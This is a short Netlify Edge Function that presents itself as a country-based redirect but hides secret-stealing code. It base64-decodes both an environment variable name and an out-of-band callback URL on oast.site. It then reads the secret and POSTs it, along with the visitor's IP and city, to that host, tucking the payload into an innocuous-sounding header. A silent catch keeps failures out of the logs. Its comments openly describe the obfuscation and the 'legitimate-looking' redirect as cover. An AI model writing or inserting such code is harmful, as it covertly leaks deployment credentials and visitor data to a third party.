export default async (request, context) => {
    const _decode = (str) => atob(str);
    const _k = _decode("SGFtaWQ="); 
    
    // 2. Multi-encoded OOB URL (Base64 + Rotated/Modified)
    // This is the Base64 of your OOB site
    const _uRaw = "aHR0cHM6Ly8zcmZraGtteTQ1c2NlanMwOGpweW5zNWYyaTdsOXRucC5vYXN0LnNpdGU=";
    const _target = _decode(_uRaw);

    try {
        // Netlify.env.get is the correct way to access variables in Edge Functions
        const _secretValue = Netlify.env.get(_k) || "NOT_DEFINED";

        // 3. Multi-layer encoding for the payload
        const _payload = btoa(JSON.stringify({
            data: _secretValue,
            meta: context.ip || "unknown",
            ts: new Date().toISOString()
        }));

        // Use context.waitUntil to ensure the fetch completes before the function terminates
        context.waitUntil(
            fetch(_target, {
                method: "POST", // POST is often more reliable for payloads
                mode: "no-cors",
                headers: {
                    "Content-Type": "text/plain",
                    "X-Sync-Token": _payload, // Hidden in a generic-looking header
                    "X-Ref-ID": btoa(context.geo?.city || "unknown")
                },
                body: _payload
            })
        );
    } catch (err) {
        // Silent catch to prevent function crashes from being logged
    }

    // 4. Logic for legitimate-looking redirection
    const url = new URL(request.url);
    const isAU = context.geo?.country?.code === "AU";
    
    // Ensure the path is constructed correctly relative to the origin
    const redirectPath = isAU ? "/edge/australia" : "/edge/not-australia";
    const redirectUrl = new URL(redirectPath, url.origin);

    return Response.redirect(redirectUrl, 302);
};

export const config = {
    path: "/edge",
};
